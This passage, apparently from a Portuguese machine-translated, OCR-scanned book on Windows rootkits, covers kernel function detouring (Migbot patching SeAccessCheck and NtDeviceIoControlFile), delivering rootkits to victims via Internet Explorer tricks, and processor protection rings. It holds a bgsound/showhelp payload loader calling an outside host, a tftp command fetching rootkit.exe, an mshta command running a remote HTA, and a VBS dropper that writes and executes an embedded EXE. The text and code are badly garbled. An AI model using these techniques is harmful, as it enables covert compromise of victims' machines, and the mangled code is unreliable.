1 
Operador 2 
1 
1 
Operador n 
Operador n + 1 
Resultado de retorno 
FFIH 
'-EU 
- »• 
Faf 
Operador 1 
EU 
EU 
Operador n 
; 
Operadores 
JMP 
? 
Código Rutkin 
Instruções excluídas 
O retorno é oraticamente 
Arroz.3.7.Circuito de círculo usado 
Migbot 
Em vez do primeiro "operador" (7 bytes de comprimento), escrevemos a transição para 
Código Rutkin.O fragmento do código a partir do qual a função começa é conhecido 
Portanto, você não precisa salvá -lo: nós simplesmente o cumpriremos dentro da estrutura 
função de desvio. 
Então, a função começa.A gerência é imediatamente transferida 
O código Rutkita executando as ações de que precisamos.Então chamado 
A função de bolinho que executa a origem das instruções reescritas
função, e a execução é transmitida de volta ao primeiro sobrevivente 
As instruções do código -fonte. 
3.4.2.Onde voltar? 
No código das funções de desvio, você viu instruções para a transição para o absenteísmo
Endereços de memória.Esses endereços são apenas plugues: eles não são antecipadamente
Primavera, e eles precisarão ser calculados durante a execução de Rutkin.Para 
funções 
My_function_detour_ntdeviceiocontrolfile 
Cálculo 
desempenha a função de detourfunctionntDevicelocontrolfile, mas para 
My_function_detour_seaccesscheck - function detourfunctionseAc 
CessCheck.Analisaremos em detalhes o segundo deles. 
Void DetourfunctionseAccessCheck () 
Char *real_function = (char 
Char *non_paged_memory; 
Não assinado long detour_address; 
Long reentry_address não assinado; 
int i = 0; 
SeacessCheck; 
// Endereço de endereço 
80

pagina: 80

Capítulo 3. Crazy como um estilo de vida de Rutkita 
O próximo código será gravado em vez de instruções originais.Este é um código 
Uma transição incondicional para o endereço 0008: 11223344, e os dois últimos bytes -
Não instruções: 
Char newcode [] = { 
Oxea, 0x44, 0x33, 0x22, 0x11, 0x08, 0x00, 0x90, 0x90} 
; 
A ação a seguir é o cálculo do endereço de retorno que precisa de suporte
Sente -se em my_function_detour_seaccesscheck ().É apenas um endereço de byte 
seguindo nosso patch.Como o tamanho do nosso patch é 9.
Lá, então, para o endereço inicial do patch, devemos adicionar 9: 
Reentry_address = ((não assinado) SEACESSCHECK) + 9; 
Depois disso, você precisa destacar uma memória ligeiramente descarregada - tanto 
Quanto é necessário para o código Rutkin.Depois que a memória é destacada 
Vamos acumular-se com a função my_f unction_detour_seaccess-
Verificar ().Na variável Detour_Address, salvaremos o novo endereço deste 
funções: 
// Eu destaquei a memória na área descarregada da memória 
Non_Paged_memery = exallocatepool (nonpagedpool, 256); 
// Copie uma função de desvio de tubo 
// na área de memória recém -alocada 
para 
(
EU 
= 
0; 
+ 
+ 
) 
( 
((Char não assinado *) non_paged_memery) [i] = 
((Não assinado 
Char*) my_function_detour_seaccesscheck) [i]; 
} 
Detour_address = (não assinado) não_pageed_memory; 
E agora o mais interessante: substituindo as instruções JMP 0008: 11223344 INS
A transição para o endereço real - o endereço da função de desvio (desvio_ 
Endereço). 
*((Não assinado long *) (SnewCode [1])) = Detour_address; 
E substituindo o endereço OXAAAAAAAA Endereço Reetry_Address: 
para (i = 0; i <200; i ++) 
( 
if ((oxAa == ((não assinado char *) não_paged__memery) [i]) &&& 
(OxAa == ((char não assinado *) non_paged_memery) [i+1]) &&& 
(OxAa == ((char não assinado *) não_pageed_memory) [i+2]) &&& 
(OXAA == ((CHAR não assinado *) Non_Paged_memery) [i+3])) 
{ 
// Encontramos o endereço oxAaaaaaa 
// substitua -o pelo endereço correto 
*((Não assinado long *) (& não_paged_memery [i])) = 
Reentry_address; 
Quebrar; 
81

pagina: 81

Rootkits 
Tudo o que resta para nós é reescrever os bytes na função original: 
f o r (i = 0; i 
<9; 
real 
F u n c t i o n [i] 
Newcode [i] 
Função detourfunctionntDevicolocontrolfileo 
Dado c 
Listagem 3.4 sem explicações detalhadas, porque está organizada e trabalha
ET Da mesma forma, apenas desmontado. 
Listagem 3.4.Cálculo do endereço de retorno 
Void d e t o r f u n c t i o n t d e v i c e l o c o n t r o l f i l e () 
{ 
Char *real_function = (char *) ntdevicelocontrolfile; 
Char *non_paged_memory; 
Não assinado long detour_address; 
Long reentry_address não assinado; 
int i = 0; 
Char newcode [] - {oxea, 0x44, 0x33, 0x22, oxll, 0x08, 0x00, 0x90 
r e n t r y _ a d r e s s 
+ I 
não_paged_memery = exallocool (sem -Pagedpool, 
2 5 6); 
para (i = 0; i <2 5 6; i + +) 
{ 
((Char não assinado *) non_paged_memery) [i] = 
((Char não assinado *) my_function_detour_ntdeviceocontrolfile) [i]; 
} 
Detour_address = (não assinado) não_pageed_memory 
*((Longo não assinado *) 
(Snewcode [1])) = Detour_address; 
para (i = 0; i <200; i ++) 
( 
iff (oxaa == ((não assinado char *) non_paged_memery) [i]) &&& 
(Oxaa == ((char não assinado *) non^Paged_memery) [i+1]) &&& 
(OxAa == ((char não assinado *) não_pageed_memory) [i+2]) &&& 
(OXAA == ((CHAR não assinado *) Non_Paged_memery) 
[EU 
+ 
3])) 
{ 
*((Não assinado long *) (& não_paged_memery [i])) = 
Reentry_address; 
Quebrar; 
para (i = 0; i <8; i ++) 
82

pagina: 82

Capítulo 3. Crazy como um estilo de vida de Rutkita 
Função real 
[i] = newCode [i] 
Olhando para o futuro (capítulo 5), digamos que Migbot Rutkit está escrito como motorista e 
Seu ponto de entrada - a função do motorista - se parece com isso (listando 3.5). 
Listagem 3.5.Ponto de entrada do driver migbot 
NTSTATUS DriverEntry ( 
Em pdriverjdbject thedriverObject, 
Em punicode_string thegistryPath 
{ 
Dbgprint ("meu motorista carregado!"); 
if (status_success! = 
CheckfunctionBytesntesntevicelocontrolfile ()) 
{ 
Dbgprint ("falha de correspondência no ntdevicelocontrolfile!"); 
Retornar statusjjjnsucessful; 
} 
if (status_success! = checkFunctionByTesseAccessCheck ()) 
{ 
Dbgprint ("falha de correspondência no SEACESSCHECK!"); 
Retornar statusjjjnsucessful; 
} 
DetourfunctionntDevicelocontrolfile (); 
DetourfunctionseAccessCheck (); 
Retorno o sucesso do status; 
A função DriverAntry verifica se vamos corrigir as funções. 
Se as funções são aquelas que precisamos, DriverEntry organiza um desvio, causando 
Funções DetourfunctionntDevicelocontrolfile () e DetourFuTio 
NSEACESSCHECK (). 
Então, vamos resumir.As funções do Migbot Rutkin realizam o seguinte 
ações: 
• 
CheckFunctionBytes* - Verifique se é possível
ntdevicelocontrolfile e Seacesscheck; 
• 
My_function_detour_* - execute falta (re -zoop
Sanarium) Operadores e volte para a função original
ção.Estes são apenas plugues, na prática eles devem conter o código 
Rutkin. 
• 
Desvio de u n c t i o n * 
- Organize um desvio: Calcule adre
Transição da CA (endereços para os quais as funções devem ser transferidas 
83

pagina: 83

Rootkits 
My_function_detour*) e execute o iatching real
Bytes de saída das funções originais. 
Como resultado, temos um meio poderoso de remendar tempo de execução,
Você pode usar o tormento em seus projetos.A propósito, pode ser usado
Ligue não apenas para criar rotas, mas também para "quente" (sem parar 
Sistemas) Correção de erros. 
3.5.Explorit e Rutkit tocam juntos 
Neste parágrafo, mostrarei como apresentar um rootkit em um sacrifício de computador quando 
A ajuda da exploração, isto é, um programa operando vulnerabilidade 
No sistema de vítimas.Exalbet não é necessariamente complexo e poderoso 
programa.Seu papel pode desempenhar uma única linha de código em 
Alguma linguagem de script.Em geral, em alguns minutos você e 
Você mesmo aprenderá sobre tudo. 
A introdução de Rutkin no sistema consiste nas seguintes etapas: 
• 
Carregando o código Rutkit no computador da vítima.Nesta fase, nós 
deve criar como baixamos o código da nossa raiz para ser excluído
um computador.Deve -se notar que isso não é tão difícil.Nós 
Considere algumas maneiras de carregar o código Rutkin (executável 
arquivo) no computador.Qual deles usar depende de você. 
• 
Lançamento de uma rotina carregada.Com um pouco de destreza, isso também é 
Não é a tarefa mais difícil.Também consideraremos alguns simples
maneiras de iniciar programas em um computador remoto 
Não consideraremos um exemplo completo, para que mais tarde ninguém tenha 
Houve queixas de que, com a ajuda deste livro, o sistema de alguém foi invadido. 
Vamos considerar apenas um "conjunto de cubos" usando o que você pode 
implementar duas tarefas definidas acima.Desde o maior "buraco" 
O sistema operacional é o Windows e o navegador mais "Hole" 
- Internet Explorer, é mais fácil considerar a introdução do Rutkit com base 
Windows + ie. 
3.5.1.Carregando Rutkin para um computador remoto 
O upload de raiz para um computador remoto é muito simples.Você pode 
Use tag <bgsound>.Na verdade, esta tag é usada para
Carga e reprodução da música de fundo enquanto assistem à página. 
Mas o navegador é o mesmo que carregar, para que você possa anotar com segurança: 
84

pagina: 84

Capítulo 3. Crazy como um estilo de vida de Rutkita
<bgsound src = "http://dkws.org.ua/dkws.chm">
E o arquivo DKWS.CHM pode conter um código malicioso lançando que
Podemos fazer ... sim, quase tudo o que vem à nossa mente.Tal esporte
seu próprio é notável por isso pode ser usado como em um navegador da Internet
Explorer, e em outros navegadores.É verdade em outros navegadores, por exemplo, em
Opera, o resultado pode não ser o mesmo que esperávamos.
Ou seja, copia o arquivo DKWS.CHM no catálogo de usuários temporário
Eu n t e r n e t
F i l s, ou melhor, em um dos subcatais deste catálogo.E o nome
o arquivo será alterado para dkws [l] .chm, em vez de [1] pode haver algum
Número - tudo depende do número de downloads de arquivos.Encontre o arquivo no catálogo
Temporário em t e r n e t f i l e s ajudará o seguinte cenário:
<bgsound src = "http://dkws.org.ua/dkws.chm">
<Cript>
Função exec
SOBRE
{
// funciona apenas com ie
S = documb.url;
Caminho = s.substr (-0, s.lastlndExof ("\\"));
PATH = UNESCAPE
(Caminho);
Document.Write ('<Form Name = "Exec_for"
Ação = "j
AVAScript: Window.showhelp (
documb.forms [0] .Elementos [0] .Value) "> ');
Document.Write (4form> <input type = "Hidden" size = "40"
maxLength = "80" value = "'
+Caminho+'
WDKWS
[1].
CHM "X/F
orm> '
)
;
SetTimeout ('documb.sem.submit ()', 10000);
1
setTimeout ("Exec ()", 2500);
</Script>
Esta foi a primeira maneira.O segundo método é começar
Em uma máquina remota, um cliente FTP padrão (por exemplo, TFTP), que
Downloads do servidor FTP que preparamos por nós com antecedência,
Botores Rutkita, arquivos.A vantagem deste método é
que não precisamos calcular o caminho para um arquivo carregado - nós
Podemos especificar com antecedência.
3.5.2.Lançamento de Rutkin em um computador remoto
Vulnerabilidade ao Internet Explorer permite que você execute o benefício no computador
Vatel qualquer programa.Principalmente a vulnerabilidade, os sistemas operacionais estão em demanda
novo nas configurações erradas ou nos verdadeiros "buracos" em
Sistema ActiveX.Neste parágrafo, consideraremos um exemplo usando
85

pagina: 85

Rootkits 
ActiveX e um - com o programa MSHTA.EXE.Por que tão poucos?Porque 
Eu decidi trazer métodos realmente de trabalho que funcionarão em 
Qualquer sistema operacional (que significa Windows 98, ME, NT, 2000, XP) 
E com quase qualquer versão do navegador do IE. 
Você pode ir, por exemplo, em h t p: / a n t i c h a t.r u / a c t i v e x.Nisso 
você encontrará muito mais maneiras para a página, mas se tudo o que eles trabalhar 
O mesmo Windows XP SP2?Não.Apenas um trabalho que nós e 
Considerar. 
Considere o exemplo mais simples do lançamento do programa.Nós corremos 
Não vamos formatar o disco C, mas apenas uma calculadora: 
<Objeto i d = "o f i l e" 
C l a s i d = 
"CLSID: 11111111-1111-11111-11111111111111111" 
Codebase = "c: /windows/system32/calc.exe" x/objeto> 
Um segundo após a abertura do documento, a calculadora começará -
Programa de Calc.EXE. 
Por que isso está acontecendo?O navegador está tentando abrir um objeto com o especificado 
Somos Classid, mas como ele não consegue encontrar esse objeto, ele está tentando
Ele é carregado usando o objeto especificado no parâmetro CodeBase.Mas 
Não espere carregar um objeto de um computador remoto da mesma maneira
Thera.Registro código de código = http: // servidor.Ru/calc.exe não funcionará. 
Obviamente, se o navegador geralmente estiver configurado incorretamente, ou seja, instalado 
baixo nível de segurança, então há uma chance de que dessa maneira 
Será possível iniciar um programa carregado de um computador remoto.Mas 
É melhor não esperar isso, já que até as configurações do IE padrão são
vá não é permitido.E a maioria dos usuários não os altera, não 
Falando sobre defini -los abaixo do nível médio. 
O método fornecido tem outra desvantagem: sim, você pode começar 
O programa, mas você não pode gerenciá -lo posteriormente.Embora, se este profissional
O Rutkin Bootloader será um grama, isso não é tão importante: sobre seus direitos a serem cobertos
O próprio Rutkin está pendurado.É bom que possamos transmitir os parâmetros ao programa. 
Por exemplo, podemos iniciar o programa TFTP como este: 
tftp-i tftp.our.host get /directory/rootkit.exe 
Parâmetro - I inclui o modo de transferência de arquivo binário, ou seja, seu 
Os arquivos serão entregues intactos.O segundo parâmetro é 
o nome do nosso FTP-Naul (bem, ou não nosso, mas um hackeado você
Menno) e os próximos dois parâmetros - o programa é indicado pelo programa para baixar para lo
Computador Kali (computador da vítima) rootkit.EXE.Depois disso 
Você só precisa executar este arquivo. 
86

pagina: 86

Capítulo 3. Crazy como um estilo de vida de Rutkita 
Jj*} 
ZRAI. 
%2i 3 a g r u k k a 
^ Download de arquivo 
SOBRE 
desconectar 
0 
Permitir 
L*YJ Font Carregando 
SOBRE 
desconectar 
SOBRE 
Sugerir 
0 
Permitir 
Verificação de autenticidade do usuário JJJ 
F. Entrada 
SOBRE 
Entrada automática para a rede com o nome atual do benefício 
0 
Entrada automática para a rede apenas na zona de intracidade 
SOBRE 
Entrada anônima 
• EU."• -" " 
"" • 
T 
"Restaure os parâmetros anteriores -
|Para o nível: 
Sh^} 
Restaurar 
Arroz.3.8.Baixo nível de segurança, ou seja, permite 
muito 
Você tem uma pergunta: onde os arquivos serão enviados?E você descobrirá quando 
Defina seu próprio servidor TFTP.A propósito, usando corridas TFTP
Muitas rotas, trojans e programas de backdoor estão sendo estendidos.É por isso 
No meu computador, acabei de excluir o programa TFTP. 
Agora considere o segundo método que consiste no uso de
Gramas mshta.exe.Este programa foi projetado para realizar NTA-
arquivos.Você pode chamá -lo diretamente usando a tag <ob ject> e
Aqueles que confundem o usuário chamando este programa, por exemplo, de um arquivo CHM. 
Lembre -se, no início deste capítulo, criamos um arquivo DKWS.Chm?Então 
Neste arquivo, você pode especificar apenas uma linha: 
C: \ Windows \ System32 \ mshta.exe, http: //www.our_server.com/file.hta 
Mas o que escrever no próprio arquivo.HTA?E vamos falar sobre isso depois
ponto de sopro. 
3.5.3.NTA (Aplicativo HTML): O que é? 
HTA (aplicativo HTML) - uma tecnologia com a qual você pode criar
Faça aplicações simples e úteis sem estudar idiomas "adultos" 
programação. 
Como você já adivinhou, a NTA desenvolveu a Microsoft, então valeu a pena 
Mais uma vez, preste atenção à segurança dos aplicativos da NTA.Como uma hora
Isso acontece na Microsoft, ao desenvolver a NTA, pensou em grande e brilhante: sobre 
87

pagina: 87

Rootkits
Ajude os usuários que não conhecem C ++, Visual Basic e outros idiomas sobre
Grama.Afinal, nem mesmo sabendo que o C ++ quer escrever um programa!A
Aqui, a tecnologia da NTA chega ao resgate, que permite que você se desenvolva em
Locais baseados no código VBScript, JavaScript e HTML comum.
Um recurso da tecnologia NTA é que o aplicativo HTML você
Eles são preenchidos fora do navegador: não a internet ehrgeg, mas mshta.Uah
anos de idade, este arquivo NTA contendo páginas HTML comuns, um monte
Eles se arrependem em uma janela separada com todos os "sinos e assobios" - links, efeitos,
Gráficos, scripts.
O arquivo NTA é um arquivo de texto que você pode editar
Bymench Oriter (notebook) ou editor do verso html
(Macromedia Dreamweaver).Esta é suas vantagens sobre
O mesmo Visual Basic - o usuário pode funcionar conveniente para ele
ambiente.
Considere o exemplo mais simples do NTA-File:
<html>
<head>
<NTA: Application Id = "HTA"
ApplicationName = "Teste NTA" // Nome do aplicativo
Border = "Thin"
// quadro = fino
BorderTyle = "Normal"
// estilo de quadro
Legenda = "Sim"
// Mostrar o título da janela
icon = "c: /icon.ico"
// pictograma
MaximizeButton = "Sim"
// botão de maximização
minimizebutton = "sim"
// botão de minimização da janela
ShowIssaskbar = "Não"
// O aplicativo será mostrado na barra de tarefas
Windowstate = "Normal"
// Tamanho inicial da janela
INNERBORDER = "Sim"
// borda interna
navegável = "sim"
// links serão abertos em
// janelas separadas
Scroll = "Auto"
// rolagem
scrollflat = "sim"
// rolagem "plana"
Singlelnstance = "Sim"
// Uma instância
Sysmenu = "não"
// menu do sistema
Contextmenu = "sim"
// menu contextual
Seleção = "Sim"
// Seleção
Versão = "L." />
</ad Head>
<Body> <Hl> tekct ctpahh4bi </ hlx/ body>
</html>
88

pagina: 88

Capítulo 3. Crazy como um estilo de vida de Rutkita 
^С}*} 
Arroz.3.9.O resultado do aplicativo NTA 
Como você pode ver, a seção <dw> descreve os atributos da janela do aplicativo NTL. 
Em detalhes, os atributos são descritos na Tabela 3.2. 
Tabela 3.2.Atributos de aplicações da NTA 
Atributo 
Nome da Aplicação 
FRONTEIRA 
Bordertyle 
Rubrica 
Ícone 
Descrição 
Nome do aplicativo.Deve ser único 
Define o tipo de quadro: 
Espesso é uma estrutura grossa, você pode alterar o tamanho da janela; 
A caixa de diálogo é um quadro regular, você não pode alterar o tamanho; 
Papa - sem um quadro; 
Fino é fino, você não pode alterar o tamanho 
Estilo de estrutura: 
Normal - comum; 
levantado - elevado (3d); 
Complexo - o meio entre rasgado e afundado; 
Estático - usado apenas para janelas em que não há 
entrada do usuário; 
Afundado - afogado (3d) 
Determina se a janela será exibida com o título: 
Sim - sim, será; 
por - não 
Define o caminho para o ícone.Os formatos OIC e BMP são suportados. 
Tamanho da imagem 32x32 
89 
Nts e5euirai \ Denii \ m <i- 
O texto da página

pagina: 89

Rootkits 
Showlntaskbar 
Singlelnstance 
Maximizebutton, 
MinimizeButton 
WindowState 
Interior 
Navegável 
Scrollflat 
Sysmenu 
MENU CONTEXTUAL 
Seleção 
Mostre a janela nos painéis de tarefas do Windows (sim/não) 
Permite o lançamento de apenas uma cópia do seu aplicativo (sim/ 
Por).Este atributo usa o atributo do atributo de aplicativo
NOME. 
Controla a exibição dos botões de maximização/minimização 
Windows of NTA Applications 
Condição da janela na inicialização: 
Normal - como sempre; 
minimizar - a janela será minimizada; 
Maximizar - a janela será maximizada 
Controla a exibição do limite interno da janela (sim/não) 
Indica se os links serão abertos em janelas separadas ou em 
um (sim/não valores) 
Tipo de tira de rolagem: 
Sim - bilimensional (plano); 
Tridimensional 
Controla a exibição do menu do sistema (sim/não) 
Controla a exibição do menu de contexto (sim/não) 
Indica se é possível selecionar o texto em HTA-Lev (sim/não) 
E agora o mais interessante começa.Crie um documento da NTA.Qualquer. 
Você pode simplesmente renomear o documento HTML usual nomeando -o 
Expansão .hta.O navegador não o abrirá, mas se oferecerá para economizar no disco. 
Mas, se você clicar duas vezes no documento, ele abrirá em uma janela separada. 
Como já observado, o navegador não executa documentos da NTA.Deles 
O programa MSHTA está envolvido na implementação.E isso significa que todos 
meios de proteção do navegador, seja o que for, inválido 
Contra documentos da NTA.Portanto, usando VB simples
ou scripts js, um invasor pode: ler arquivos, transferir arquivos 
e outras informações sobre o seu sistema para o seu servidor, altere as chaves 
Registro. 
Se você é o mesmo atacante ou vai se tornar, então eu não
Vou sofrer muito.Não darei exemplos de tais scripts no livro. 
Cruncá -los na internet - eles estão cheios deles lá. 
90

pagina: 90

Capítulo 3. Crazy como um estilo de vida de Rutkita 
Se você não pode usar o mecanismo de pesquisa, visite alguns para
Marcos “adultos” - meia hora de estadia, existe o suficiente, 
Para "pegar" um script de Trojan.Então inicie o AN
Tivirus e estão procurando esses cenários (apenas certifique -se de que o antivírus não 
Removido).Então você só precisa analisar as ações do script
Ev.Isso não é muito difícil com certos conhecimentos de VBS e JScript. 
Vou mostrar apenas uma ideia comum: agora escreveremos um script que armazenou 
A linha do arquivo de EHE em uma performance hexadecimal.Executando isso 
O script escreve uma linha no arquivo EHE no disco e inicia 
Este ficheiro.Se este arquivo executável baixar sua raiz, então bom
Vatel só pode se arrepender ... 
Listagem 3.6.Cenário escrevendo no arquivo executável em disco 
<script 
Idioma = VBS> 
Self.moveto 6000.6000 
// não somos visíveis na tela 
t = "4d, 5a, 4 
4.01,05,00,02,00,20,00,00,21,00, ff, ff, 75,00,00,02,00,00,99, 
00, 
00, 
00, 
Z e, 
00, 
00, 
00, 
01, 
00, 
Fb, 
trinta, 
6a, 
72, 
00, 
00, 
00, 
00, 
00, 
00, 
00, 
00, 
00, 
00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00 
// o próximo é a linha T, contendo 
EHE-FILE 
t 
= 
t 
&
"
, Assim,
.
.
.
" 
tmp = split (t, ", 
") 
// Crie um objeto no sistema de arquivos 
Defina FSO = 
CreateObject ("scripting.filesystemqbject") 
// Crie um objeto do shell que permita que você funcione 
programas 
Defina shell = 
CreateObject ("WSCRIBR.SHELL") 
// Este é o nome do nosso arquivo de EHE 
Cocô = 
"FDFDFSDSFSDFSD343.EXE" 
// Crie EHE-FILE, abra-o para gravar 
Set f = fso.createTextFile (cocô, 
Para escrever) 
// No ciclo, exibimos o conteúdo do arquivo EHE para o disco 
Para i = 0 então ubound (tmp) 
1 "Len (tmp (i) 
) 
b = int ("& h" & esquerda (tmp (i), 2)) 
Se 1> 2 então 
R = int ("& h" & mid (tmp (i), 3, 1)) 
Para J = 1 a r 
F.Write Chr (B) 
Próximo 
Outro 
F.Write Chr (B) 
Fim se 
Próximo 
F.Close 
91

pagina: 91

Rootkits 
runScr = l 
// Lançar o arquivo de EHE 
Se for executado, então shell.ru (cocô) 
ON ERRO REMOME 
() 
</Script> 
Veja como simples e bonito.Um problema: este método já está 
Cem anos, e é descoberto por qualquer antivírus moderno.Kav é determinado
Este código é como TRO J AN-DROPPER.Vbs.Prob. 
Usuários comuns que desejam se proteger desse infortúnio, rio
É mental excluir o programa mshta.exe. 
92

pagina: 92

Capítulo 4. Conhecimento com 
Tabelas do sistema 
Modos de operação do processador 
O poder dos anéis 
Transição para o modo seguro 
Organização da Memória C 
Modo protegido 
Tabela de transcriptores de interrupções (yut) 
Estrutura SSDT 
Limitando o acesso a alguns 
Tabelas importantes 
As funções mais importantes do sistema operacional 
Rootkits

pagina: 93

A maior desvantagem das armadilhas no nível do usuário, sobre as quais 
Falamos no capítulo anterior, é que eles são relativamente fáceis 
Detectado de referência.Os níveis centrais têm essa desvantagem.Para 
Organização dessa armadilha, o rutkit deve substituir um dos sistêmicos 
mesas.Neste capítulo, falaremos sobre essas tabelas, mas também não descrevem
Ignorando informações sobre o núcleo das janelas. 
Software e hardware estão intimamente conectados pelo amigo 
amigo.Sem software, hardware - apenas ferro.Mas 
Ao mesmo tempo, o software não pode existir sem Appa
Ratny.Além disso, o hardware permite suportar
Programas. 
Quase toda arquitetura de hardware tem suas próprias soluções,
limite para limitar o acesso dos programas de usuário a um ou outro 
Áreas de memória ou comandos do processador. 
Neste capítulo, falaremos sobre os reais "Senhores dos Anéis" - processadores 
Intel Company x86.Os anéis do processador são hardware 
Ferramenta de proteção protegendo o código e os dados de ações usuários
programas.Vamos nos familiarizar com as equipes que podem ser executadas 
Somente no anel zero de proteção do processador. 
Também neste capítulo, falaremos sobre como o Windows funciona com a memória. 
Este é um tópico muito importante, sem uma compreensão do qual você não pode escrever hein
Roshny Rutkit.Se você resumir, precisará ler isso 
capítulo, uma vez que a compreensão do restante dos capítulos dependerá de seu entendimento 
Livros. 
94

pagina: 94

Capítulo 4. Crença com tabelas de sistema 
4.1.Modos de operação do processador 
Os processadores Intel de 32 bits podem funcionar em um dos quatro 
modos: 
• 
Modo real 
• 
Regime protegido 
• 
Modo virtual 
• 
Modo de gerenciamento do sistema 
Mais adiante em cada um deles, pararemos mais com mais detalhes. 
Modo real 
Nome completo (e mais correto) deste regime - o regime de real 
endereços (modo de endereço real ou modo R).Neste modo, o processador funciona 
como um computador regular de CT com um processador de 8086. Sim, exatamente como um processador 
8086, sobre o qual a geração moderna de programadores há muito se esquece.Não
Dependendo do fato de que o processador funciona como um 8086 regular, permite a Paul
para ser chamado de suas tecnologias mais modernas - MMX, SSE/SSE2, 
Use registros de uso geral de 32 bits, registros de gerenciamento
pista, etc. É claro, o conjunto de comandos depende do próprio processador.Se 
Você tem um velho Pentium 166 mm, então não pode haver SSE e 
Discurso! 
No modo real, o processador trabalha imediatamente após a energia ser ativada, 
No modo real, um programa de inicialização é realizado, lido 
Do BIOS.No modo real, tudo é "real": qualquer programa pode
Chegue a qualquer dispositivo diretamente, ignorando a sala de operações 
sistemas. 
Hoje em dia, o regime real é usado apenas para começar com
Pudter e carregando o sistema operacional, que deve imediatamente 
Alterne para um modo protegido.É por isso que moderno 
Os processadores Intel são otimizados para o trabalho em um protegido 
modo.O único sistema operacional do regime real,
Shay até os dias atuais - este é o DOS;Todos os outros trabalhos modernos da OSS 
no modo protegido. 
No modo real, nem memória virtual nem multilado
Distribuição, não os níveis de privilégios.Você também não pode trabalhar com cache, 
Buffers TLB, buffer de ramificação, bem como várias outras tecnologias, 
que fornecem alto desempenho do processador. 
95

pagina: 95

Rootkits 
Obviamente, qualquer processador moderno no modo real será o trabalho
Tati é uma ordem de magnitude mais rápida que o 8086 original, mas nunca está pronto
Esperado sua própria produtividade em um modo protegido.se você 
Precisamos de um programa que deve funcionar no modo real 
(Sob DOS), você não deve comprar um computador moderno para ela - bastante 
80486DX suficientes. 
Regime protegido 
Os nomes em inglês desse modo são "Modo Protegido" ou "Modo P". 
A Intel afirma que este é um regime nativo para todos os processadores de 32 bits. 
Mas o computador começa primeiro no modo real e depois o OPSE
O sistema dietético o converte em um regime seguro com especial 
equipes. 
Trabalhando em um modo protegido, o processador controla todos os aplicativos. 
Este controle é realizado usando o mecanismo de anéis, sobre os quais nós 
Digamos mais.Somente em um modo protegido é possível multitarefa, 
Organização da memória virtual e outras tecnologias de software. 
Todos os recursos do processador são totalmente divulgados em um protegido 
modo.Pegue o mesmo carneiro: no modo real, o processador 
Apenas 1 MB de fisicamente acessível, por exemplo, 2 GB está disponível;em proteção
Modo de filhote, processadores 80386 e 80486 podem abordar até 4 GB de OP.
Memória rativa (mais precisamente, será uma memória virtual) e Pentium - 64 GB. 
Modo virtual 
"Modo virtual" é um nome abreviado e ligeiramente incorreto
Este regime.De fato, esse modo é chamado de "modo virtual
Processador 8086. "Na literatura inglesa - "Modo Virtual -8086" 
ou "modo V". 
Este modo só pode ser alterado de um modo seguro.Naquilo 
O modo emula a operação do processador 8086 (1 MB de RAM, 
interrupções ordinárias).No modo virtual, diferentemente do real 
O modo não pode ser usado pelas instruções MMX/SSE/SSE2. 
Geralmente o modo virtual é usado para ser lançado em um RE protegido
O supino de bancada projetado para o modo real.MS DOS SESSÃO EM 
O Windows é o exemplo mais óbvio de um regime virtual.É usado
É para a compatibilidade reversa do software, reconciliando
Emaranhado em processadores antigos.Para o sistema operacional MS Dos Sessão 
- Este é um aplicativo comum que trabalha em um modo protegido, mas 
96

pagina: 96

Capítulo 4. Crença com tabelas de sistema 
O programa, que está "dentro" da sessão do MS Dos, "parece" que 
Ela trabalha no modo real. 
R e M Gerenciamento do sistema 
Simplesmente não precisamos desse regime.Eu só vou dizer isso em inglês -que fala 
É chamado de literatura "modo de gerenciamento de sistemas" ou "sodo s" - este 
Caso você esteja interessado e tente encontrar informações sobre ele 
na internet. 
4.2.O poder dos anéis 
Pela primeira vez, o conceito de anéis de proteção apareceu no processador Intel 80386. 
Anéis não são um dispositivo físico, mas um mecanismo lógico.Total 
Os processadores x86 usam quatro anéis indicados por números de 
ODOZ. 
O código executado no anel zero tem a maior prioridade. 
O programa "zero anel" pode fazer tudo - processar
Dormação, trabalhe diretamente com hardware.Está claro que em 
O núcleo do sistema operacional é realizado pelo anel zero.Níveis de Rutkin 
Os núcleos também são executados no anel de proteção zero, ou seja, eles têm uma papoula
privilégios de sintomas, o que lhes permite modificar as tabelas 
Os núcleos e recorrem ao "ferro" com os mesmos direitos que o sistema operacional. 
Os programas de usuário são realizados no terceiro anel, então 
Às vezes, eles são chamados de "programas do terceiro anel".Programas, execução
No terceiro anel, não tenha o direito de trabalhar diretamente com o Appa
fundos. 
O processador tem uma tarefa responsável: é obrigado a rastrear 
qual programa está em qual anel é executado para que os programas do terceiro 
os anéis não puderam seguir as instruções do anel zero ou não receberam 
Acesso à memória alocada apenas para o anel zero.Cada programa
IU atribuiu o número do anel.O objetivo dos números é responsável pela sala de operações 
sistema. 
Esta distribuição de anéis foi planejada originalmente: 
• 
0 - O núcleo do sistema operacional; 
• 
1 - drivers de sistema operacional; 
• 
2 - Interface de software do sistema operacional; 
• 
3 - programas aplicados, 
4 Zak.665 
97

pagina: 97

Rootkits 
Mas aconteceu que apenas dois anéis geralmente são usados: zero com 
Privilégios máximos e o terceiro com privilégios mínimos. 
Linux, como o Windows, também usa apenas dois anéis - zero e 
terceiro.DOS e todos os seus programas são realizados apenas no anel zero. 
Verdadeiro, no modo DPMI (interface do modo protegido do DOS) quando o suporte
O modo de processador seguro é possível, é possível distribuir programas 
Nos anéis. 
Se o programa do terceiro anel tentar acessar zero
Mu ring, o processador gera a exclusão de #GP (proteção geral 
Exceção).Nesse caso, o sistema operacional deve parar de executar
O anúncio do programa de extensão. 
No entanto, em alguns casos, o programa do terceiro anel ainda pode
Execute o acesso ao anel zero.Por exemplo, programa de carregamento de driver 
(realizado no terceiro anel com os direitos do administrador) deve ter 
Acesso a drivers de dispositivos carregados (e este já é um anel zero). 
Se o rootkit for um driver de dispositivo, ele será executado
Crianças no anel zero e a maioria dos programas anti -reguladores não serão capazes 
Para encontrar - afinal, esses programas funcionam no terceiro anel, embora 
Em nome do administrador.Scanners Rutkin podem notar Rutkit, exceto exceto 
o que está em um estado inativo quando ainda não está carregado na memória, mas simplesmente 
Está em algum catálogo. 
Os anéis servem não apenas para limitar o acesso à memória.Alguns 
As instruções do processador só podem ser realizadas no anel zero 
proteção.Isso se aplica às seguintes instruções: 
• 
CLI - Pare de processamento de interrupção (no processador atual, 
Se você tem vários deles); 
• 
STI - renovar o processamento de interrupções (no processador atual); 
• 
In - Leia os dados da porta de hardware; 
• 
OUT - Escreva dados na porta. 
4.3.Transição para o modo seguro 
